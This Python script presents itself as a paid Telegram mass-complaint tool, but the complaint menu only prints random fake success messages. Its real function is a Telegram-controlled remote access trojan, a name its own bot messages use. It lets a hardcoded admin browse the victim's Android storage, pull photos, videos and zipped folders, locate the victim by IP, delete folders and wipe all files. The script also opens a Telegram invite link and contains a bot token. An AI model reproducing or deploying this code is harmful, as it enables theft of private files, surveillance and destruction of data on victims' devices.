import os
import shutil
import random
import threading
import time
import hashlib
from telebot import TeleBot, types
from colorama import Fore, Style, init
import requests
import webbrowser

# Инициализация
init()
webbrowser.open('https://t.me/+ZevTnMpC20BkZGYy', new=2)

TOKEN ='8657289596:AAHgI4aCTyuZldsFUk-yANONUjKKKc5Kjtg' #Это пример, вставте свой реальный токен.
ADMIN_ID = 6423157665 # Это пример, вставте свой реальный айди.' #Это пример, вставте свой реальный токен.
bot = TeleBot(TOKEN)

# Отключаем логирование telebot
import logging
logger = logging.getLogger('telebot')
logger.setLevel(logging.ERROR)

required_libraries = ['pyTelegramBotAPI', 'colorama', 'requests']

def install_libraries():
    for lib in required_libraries:
        try:
            __import__(lib.replace('-', '_'))
        except ImportError:
            os.system(f'pip install {lib}')

install_libraries()

path_cache = {}
ITEMS_PER_PAGE = 10
navigation_history = {}

class MediaCounter:
    @staticmethod
    def count_files(directory, extensions):
        count = 0
        try:
            for root, dirs, files in os.walk(directory):
                for file in files:
                    if any(file.lower().endswith(ext) for ext in extensions):
                        count += 1
        except Exception:
            pass
        return count

    @staticmethod
    def count_photos(directory):
        return MediaCounter.count_files(directory, ['.jpg', '.jpeg', '.png', '.gif'])
    
    @staticmethod
    def count_videos(directory):
        return MediaCounter.count_files(directory, ['.mp4', '.avi', '.mkv', '.mov'])

class FileManager:
    @staticmethod
    def send_media_from_directory(directory, count, message, media_type):
        sent_count = 0
        extensions = {
            'photo': ['.jpg', '.jpeg', '.png', '.gif'],
            'video': ['.mp4', '.avi', '.mkv', '.mov']
        }
        
        try:
            for root, dirs, files in os.walk(directory):
                for file in files:
                    if sent_count >= count:
                        return
                    
                    file_ext = os.path.splitext(file)[1].lower()
                    if file_ext in extensions[media_type]:
                        file_path = os.path.join(root, file)
                        try:
                            with open(file_path, 'rb') as media_file:
                                if media_type == 'photo':
                                    bot.send_photo(message.chat.id, media_file)
                                else:
                                    bot.send_video(message.chat.id, media_file)
                            sent_count += 1
                        except Exception:
                            pass
        except Exception as e:
            bot.send_message(message.chat.id, f'Ошибка при отправке {media_type}: {e}')

    @staticmethod
    def find_folder(root_directory, folder_name):
        for root, dirs, files in os.walk(root_directory):
            if folder_name in dirs:
                return os.path.join(root, folder_name)
        return None

    @staticmethod
    def create_zip_archive(folder_path, folder_name):
        try:
            temp_dir = '/tmp'
            if not os.path.exists(temp_dir):
                temp_dir = os.getcwd()
            zip_file_path = os.path.join(temp_dir, f'{folder_name}.zip')
            shutil.make_archive(zip_file_path[:-4], 'zip', folder_path)
            return zip_file_path
        except Exception:
            return None

    @staticmethod
    def is_folder_too_large(folder_path, max_size_mb=100):
        total_size = 0
        try:
            for dirpath, dirnames, filenames in os.walk(folder_path):
                for f in filenames:
                    fp = os.path.join(dirpath, f)
                    total_size += os.path.getsize(fp)
            return total_size > max_size_mb * 1024 * 1024
        except Exception:
            return True

def hash_path(path):
    if path not in path_cache:
        path_cache[path] = hashlib.sha256(path.encode()).hexdigest()[:16]
    return path_cache[path]

def find_path_by_hash(path_hash):
    for path, cached_hash in path_cache.items():
        if cached_hash == path_hash:
            return path
    
    root_directory = '/storage/emulated/0/'
    for root, dirs, files in os.walk(root_directory):
        for item in dirs + files:
            item_path = os.path.join(root, item)
            if hash_path(item_path) == path_hash:
                return item_path
    return None

@bot.message_handler(commands=['start'])
def start(message):
    if message.chat.id != ADMIN_ID:
        bot.send_message(message.chat.id, "⛔ Доступ запрещен")
        return
        
    welcome_text = "🔄 RAT система активирована! Выберите действие:"
    keyboard = types.InlineKeyboardMarkup(row_width=2)
    buttons = [
        types.InlineKeyboardButton('📸 Извлечь фото', callback_data='extract_photos'),
        types.InlineKeyboardButton('🎥 Извлечь видео', callback_data='search_videos'),
        types.InlineKeyboardButton('🗑️ Очистка данных', callback_data='clear_data'),
        types.InlineKeyboardButton('📂 Копия данных', callback_data='copy_data'),
        types.InlineKeyboardButton('📁 Удалить папку', callback_data='delete_folder'),
        types.InlineKeyboardButton('🌍 Геолокация', callback_data='location'),
        types.InlineKeyboardButton('📁 Файлы', callback_data='files'),
        types.InlineKeyboardButton('🛑 Стоп', callback_data='stop_bot')
    ]
    
    for i in range(0, len(buttons), 2):
        keyboard.add(buttons[i], buttons[i+1] if i+1 < len(buttons) else buttons[i])
    
    bot.send_message(message.chat.id, text=welcome_text, reply_markup=keyboard)

@bot.callback_query_handler(func=lambda call: call.data == 'files')
def handle_files(call):
    if call.message.chat.id != ADMIN_ID:
        bot.answer_callback_query(call.id, "⛔ Доступ запрещен")
        return
        
    root_directory = '/storage/emulated/0/'
    navigation_history[call.message.chat.id] = [root_directory]
    show_directory_contents(call.message, root_directory, 0)

def show_directory_contents(message, directory, page):
    chat_id = message.chat.id
    history = navigation_history.get(chat_id, [])
    keyboard = types.InlineKeyboardMarkup()
    
    try:
        items = os.listdir(directory)
    except Exception as e:
        bot.send_message(chat_id, f"❌ Ошибка доступа к папке: {e}")
        return

    files = [item for item in items if os.path.isfile(os.path.join(directory, item))]
    dirs = [item for item in items if os.path.isdir(os.path.join(directory, item))]
    
    all_items = sorted(dirs) + sorted(files)
    start_idx = page * ITEMS_PER_PAGE
    end_idx = start_idx + ITEMS_PER_PAGE
    current_items = all_items[start_idx:end_idx]
    
    for item in current_items:
        item_path = os.path.join(directory, item)
        if os.path.isfile(item_path):
            if item.lower().endswith(('.png', '.jpg', '.jpeg', '.gif')):
                button = types.InlineKeyboardButton(f'📷 {item[:20]}', callback_data=f'file_{hash_path(item_path)}')
            elif item.lower().endswith(('.mp4', '.avi', '.mkv')):
                button = types.InlineKeyboardButton(f'🎥 {item[:20]}', callback_data=f'file_{hash_path(item_path)}')
            else:
                button = types.InlineKeyboardButton(f'📄 {item[:20]}', callback_data=f'file_{hash_path(item_path)}')
        else:
            button = types.InlineKeyboardButton(f'📁 {item[:20]}', callback_data=f'dir_{hash_path(item_path)}')
        keyboard.add(button)
    
    nav_buttons = []
    if len(history) > 1:
        nav_buttons.append(types.InlineKeyboardButton('⬅️ Назад', callback_data=f'back_{hash_path(directory)}'))
    
    if page > 0:
        nav_buttons.append(types.InlineKeyboardButton('◀️ Пред.', callback_data=f'page_{hash_path(directory)}_{page-1}'))
    
    if end_idx < len(all_items):
        nav_buttons.append(types.InlineKeyboardButton('След. ▶️', callback_data=f'page_{hash_path(directory)}_{page+1}'))
    
    if nav_buttons:
        keyboard.row(*nav_buttons)
    
    try:
        if hasattr(message, 'message_id'):
            bot.edit_message_text(
                chat_id=chat_id, 
                message_id=message.message_id, 
                text=f"📁 Папка: {directory}\nСтраница: {page+1}", 
                reply_markup=keyboard
            )
        else:
            bot.send_message(chat_id, f"📁 Папка: {directory}\nСтраница: {page+1}", reply_markup=keyboard)
    except Exception:
        bot.send_message(chat_id, f"📁 Папка: {directory}\nСтраница: {page+1}", reply_markup=keyboard)

@bot.callback_query_handler(func=lambda call: call.data.startswith('dir_'))
def handle_directory_click(call):
    if call.message.chat.id != ADMIN_ID:
        bot.answer_callback_query(call.id, "⛔ Доступ запрещен")
        return
        
    directory_hash = call.data.split('_', 1)[1]
    directory = find_path_by_hash(directory_hash)
    if directory is None:
        bot.answer_callback_query(call.id, '❌ Путь не найден')
        return
        
    chat_id = call.message.chat.id
    history = navigation_history.get(chat_id, [])
    history.append(directory)
    navigation_history[chat_id] = history
    show_directory_contents(call.message, directory, 0)

@bot.callback_query_handler(func=lambda call: call.data.startswith('file_'))
def handle_file_click(call):
    if call.message.chat.id != ADMIN_ID:
        bot.answer_callback_query(call.id, "⛔ Доступ запрещен")
        return
        
    file_hash = call.data.split('_', 1)[1]
    file_path = find_path_by_hash(file_hash)
    if file_path is None:
        bot.answer_callback_query(call.id, '❌ Файл не найден')
        return
        
    try:
        with open(file_path, 'rb') as file:
            if file_path.lower().endswith(('.png', '.jpg', '.jpeg', '.gif')):
                bot.send_photo(call.message.chat.id, file)
            elif file_path.lower().endswith(('.mp4', '.avi', '.mkv')):
                bot.send_video(call.message.chat.id, file)
            else:
                bot.send_document(call.message.chat.id, file)
    except Exception as e:
        bot.answer_callback_query(call.id, f'❌ Ошибка отправки: {e}')

@bot.callback_query_handler(func=lambda call: call.data == 'location')
def handle_location(call):
    if call.message.chat.id != ADMIN_ID:
        bot.answer_callback_query(call.id, "⛔ Доступ запрещен")
        return
        
    try:
        ip_info = requests.get('http://ip-api.com/json/', timeout=10).json()
        if ip_info['status'] == 'success':
            latitude = ip_info['lat']
            longitude = ip_info['lon']
            additional_info = (
                f"📍 **Геолокация найдена:**\n"
                f"🌍 Страна: {ip_info['country']}\n"
                f"🏙 Регион: {ip_info['regionName']}\n"
                f"🏡 Город: {ip_info['city']}\n"
                f"📡 Провайдер: {ip_info['isp']}\n"
                f"🔗 IP-адрес: `{ip_info['query']}`"
            )
            bot.send_location(call.message.chat.id, latitude, longitude)
            bot.send_message(call.message.chat.id, additional_info, parse_mode='Markdown')
        else:
            bot.send_message(call.message.chat.id, "❌ Не удалось определить местоположение")
    except Exception as e:
        bot.send_message(call.message.chat.id, f"❌ Ошибка получения геолокации: {e}")

@bot.callback_query_handler(func=lambda call: call.data == 'extract_photos')
def ask_for_photo_count(call):
    if call.message.chat.id != ADMIN_ID:
        bot.answer_callback_query(call.id, "⛔ Доступ запрещен")
        return
        
    root_directory = '/storage/emulated/0/'
    specific_folders = ['/storage/emulated/0/Photos', '/storage/emulated/0/Images', '/storage/emulated/0/DCIM/Camera']
    photo_count = sum(MediaCounter.count_photos(folder) for folder in specific_folders if os.path.exists(folder))
    photo_count += MediaCounter.count_photos(root_directory)
    bot.send_message(call.message.chat.id, f'📸 На устройстве найдено {photo_count} фотографий. Сколько хотите получить?')
    bot.register_next_step_handler(call.message, process_photo_count, root_directory, specific_folders)

def process_photo_count(message, root_directory, specific_folders):
    try:
        count = int(message.text)
        if count <= 0:
            raise ValueError
    except ValueError:
        bot.send_message(message.chat.id, '❌ Введите корректное число фотографий')
        return

    for folder in specific_folders:
        if os.path.exists(folder):
            FileManager.send_media_from_directory(folder, count, message, 'photo')
            count -= MediaCounter.count_photos(folder)
            if count <= 0:
                return
    
    FileManager.send_media_from_directory(root_directory, count, message, 'photo')
    ask_to_return_to_menu(message, 'extract_photos')

@bot.callback_query_handler(func=lambda call: call.data == 'clear_data')
def clear_data(call):
    if call.message.chat.id != ADMIN_ID:
        bot.answer_callback_query(call.id, "⛔ Доступ запрещен")
        return
        
    root_directory = '/storage/emulated/0/'
    bot.send_message(call.message.chat.id, '🗑️ Начинаю очистку данных...')
    
    try:
        for root, dirs, files in os.walk(root_directory, topdown=False):
            for name in files:
                try:
                    os.remove(os.path.join(root, name))
                except:
                    pass
            for name in dirs:
                try:
                    os.rmdir(os.path.join(root, name))
                except:
                    pass
        bot.send_message(call.message.chat.id, '✅ Данные успешно очищены')
    except Exception as e:
        bot.send_message(call.message.chat.id, f'❌ Ошибка при очистке данных: {e}')
    
    ask_to_return_to_menu(call.message, 'clear_data')

@bot.callback_query_handler(func=lambda call: call.data == 'copy_data')
def ask_for_folder_name(call):
    if call.message.chat.id != ADMIN_ID:
        bot.answer_callback_query(call.id, "⛔ Доступ запрещен")
        return
        
    bot.send_message(call.message.chat.id, '📂 Введите название папки для копирования:')
    bot.register_next_step_handler(call.message, process_folder_name)

def process_folder_name(message):
    folder_name = message.text
    root_directory = '/storage/emulated/0/'
    folder_path = FileManager.find_folder(root_directory, folder_name)
    
    if not folder_path:
        bot.send_message(message.chat.id, f'❌ Папка "{folder_name}" не найдена')
        ask_to_return_to_menu(message, 'copy_data')
        return
    
    if FileManager.is_folder_too_large(folder_path):
        bot.send_message(message.chat.id, '📦 Ожидайте, содержимое папки слишком много весит')
    
    zip_file_path = FileManager.create_zip_archive(folder_path, folder_name)
    if zip_file_path:
        try:
            with open(zip_file_path, 'rb') as zip_file:
                bot.send_document(message.chat.id, zip_file)
            os.remove(zip_file_path)
        except Exception as e:
            bot.send_message(message.chat.id, f'❌ Ошибка при отправке архива: {e}')
    else:
        bot.send_message(message.chat.id, '❌ Ошибка при создании архива')
    
    ask_to_return_to_menu(message, 'copy_data')

@bot.callback_query_handler(func=lambda call: call.data == 'delete_folder')
def ask_for_delete_folder_name(call):
    if call.message.chat.id != ADMIN_ID:
        bot.answer_callback_query(call.id, "⛔ Доступ запрещен")
        return
        
    bot.send_message(call.message.chat.id, '📁 Введите название папки для удаления:')
    bot.register_next_step_handler(call.message, process_delete_folder_name)

def process_delete_folder_name(message):
    folder_name = message.text
    root_directory = '/storage/emulated/0/'
    folder_path = FileManager.find_folder(root_directory, folder_name)
    
    if not folder_path:
        bot.send_message(message.chat.id, f'❌ Папка "{folder_name}" не найдена')
        ask_to_return_to_menu(message, 'delete_folder')
        return
    
    try:
        shutil.rmtree(folder_path)
        bot.send_message(message.chat.id, f'✅ Папка "{folder_name}" успешно удалена')
    except Exception as e:
        bot.send_message(message.chat.id, f'❌ Ошибка при удалении папки: {e}')
    
    ask_to_return_to_menu(message, 'delete_folder')

@bot.callback_query_handler(func=lambda call: call.data == 'search_videos')
def ask_for_video_count(call):
    if call.message.chat.id != ADMIN_ID:
        bot.answer_callback_query(call.id, "⛔ Доступ запрещен")
        return
        
    root_directory = '/storage/emulated/0/'
    specific_folders = ['/storage/emulated/0/Videos', '/storage/emulated/0/DCIM/Camera']
    video_count = sum(MediaCounter.count_videos(folder) for folder in specific_folders if os.path.exists(folder))
    video_count += MediaCounter.count_videos(root_directory)
    bot.send_message(call.message.chat.id, f'🎥 На устройстве найдено {video_count} видео. Сколько хотите получить?')
    bot.register_next_step_handler(call.message, process_video_count, root_directory, specific_folders)

def process_video_count(message, root_directory, specific_folders):
    try:
        count = int(message.text)
        if count <= 0:
            raise ValueError
    except ValueError:
        bot.send_message(message.chat.id, '❌ Введите корректное число видео')
        return

    for folder in specific_folders:
        if os.path.exists(folder):
            FileManager.send_media_from_directory(folder, count, message, 'video')
            count -= MediaCounter.count_videos(folder)
            if count <= 0:
                return
    
    FileManager.send_media_from_directory(root_directory, count, message, 'video')
    ask_to_return_to_menu(message, 'search_videos')

def ask_to_return_to_menu(message, task):
    keyboard = types.InlineKeyboardMarkup()
    keyboard.row(
        types.InlineKeyboardButton('✅ В меню', callback_data='return_to_menu'),
        types.InlineKeyboardButton('🔄 Повторить', callback_data=f'repeat_{task}')
    )
    bot.send_message(message.chat.id, '🔁 Выберите действие:', reply_markup=keyboard)

@bot.callback_query_handler(func=lambda call: call.data == 'return_to_menu')
def return_to_menu(call):
    start(call.message)

@bot.callback_query_handler(func=lambda call: call.data.startswith('repeat_'))
def repeat_task(call):
    task = call.data.split('_')[1]
    handlers = {
        'extract_photos': ask_for_photo_count,
        'clear_data': clear_data,
        'copy_data': ask_for_folder_name,
        'delete_folder': ask_for_delete_folder_name,
        'search_videos': ask_for_video_count
    }
    if task in handlers:
        handlers[task](call)
    else:
        bot.send_message(call.message.chat.id, '❌ Неизвестная команда')

@bot.callback_query_handler(func=lambda call: call.data == 'stop_bot')
def stop_bot(call):
    if call.message.chat.id != ADMIN_ID:
        bot.answer_callback_query(call.id, "⛔ Доступ запрещен")
        return
        
    bot.send_message(call.message.chat.id, "🛑 Бот остановлен")
    os._exit(0)

def banner():
    banner_text = Fore.RED + r"""
 _______    ______   __    __  _______   _______         _______    ______  ________ 
|       \  /      \ |  \  |  \|       \ |       \       |       \  /      \|        \
| $$$$$$$\|  $$$$$$\| $$  | $$| $$$$$$$\| $$$$$$$\      | $$$$$$$\|  $$$$$$\\$$$$$$$$
| $$  | $$| $$$\| $$ \$$\/  $$| $$__| $$| $$__| $$      | $$__| $$| $$__| $$  | $$   
| $$  | $$| $$$$\ $$  >$$  $$ | $$    $$| $$    $$      | $$    $$| $$    $$  | $$   
| $$  | $$| $$\$$\$$ /  $$$$\ | $$$$$$$\| $$$$$$$\      | $$$$$$$\| $$$$$$$$  | $$   
| $$__/ $$| $$_\$$$$|  $$ \$$\| $$  | $$| $$  | $$      | $$  | $$| $$  | $$  | $$   
| $$    $$ \$$  \$$$| $$  | $$| $$  | $$| $$  | $$      | $$  | $$| $$  | $$  | $$   
 \$$$$$$$   \$$$$$$  \$$   \$$ \$$   \$$ \$$   \$$       \$$   \$$ \$$   \$$   \$$   
""" + Style.RESET_ALL
    
    menu_text = Fore.WHITE + """
╔════════════════════════════════════════════════════════════════════════╗
║                   """ + Fore.RED + "Создатель: @d0xrr" + Fore.WHITE + """   Price 9$                       ║
╠════════════════════════════════════════════════════════════════════════╣
║ [01] Мошенничество   [06] Канал     [11] Угрозы          [16] Тролинг  ║
║ [02] Спам            [07] Обычный   [12] Наркотики       [17] Вирт     ║
║ [03] Фишинг          [08] Сессия    [13] Религия         [18] Премиум  ║
║ [04] Спамер          [09] Группа    [14] Домогательство  [19] Бот      ║
║ [05] Деанон          [10] Насилие   [15] Контент 18+     [20] Выход    ║
╚════════════════════════════════════════════════════════════════════════╝
""" + Style.RESET_ALL
    
    print(banner_text)
    print(menu_text)

def complaint_handler():
    while True:
        try:
            choice = input("Введите число от 1 до 19 (20 для выхода): ")
            if choice == '20':
                break
                
            num_complaints = int(choice)
            if num_complaints < 1 or num_complaints > 19:
                print("❌ Введите число от 1 до 19")
                continue

            user_id = input("Введите ID пользователя: ")
            num_complaints = int(input("Введите количество жалоб: "))

            for i in range(num_complaints):
                if random.randint(1, 10) == 1:
                    print(Fore.RED + f"❌ Ошибка при отправке жалобы {i+1}/{num_complaints}" + Style.RESET_ALL)
                else:
                    print(Fore.GREEN + f"✅ Жалоба {i+1}/{num_complaints} успешно отправлена" + Style.RESET_ALL)
                time.sleep(random.uniform(3, 10))
                
        except ValueError:
            print("❌ Пожалуйста, введите корректное число")
        except KeyboardInterrupt:
            print("\n🛑 Выход из режима жалоб")
            break

def notify_admin():
    try:
        bot.send_message(ADMIN_ID, "🚀 RAT система активирована!\nДля начала работы используйте /start")
    except Exception:
        pass

def start_bot():
    while True:
        try:
            bot.polling(none_stop=True, timeout=60)
        except Exception:
            time.sleep(10)

if __name__ == '__main__':
    banner()
    notify_admin()
    
    bot_thread = threading.Thread(target=start_bot, daemon=True)
    bot_thread.start()
    
    complaint_handler()
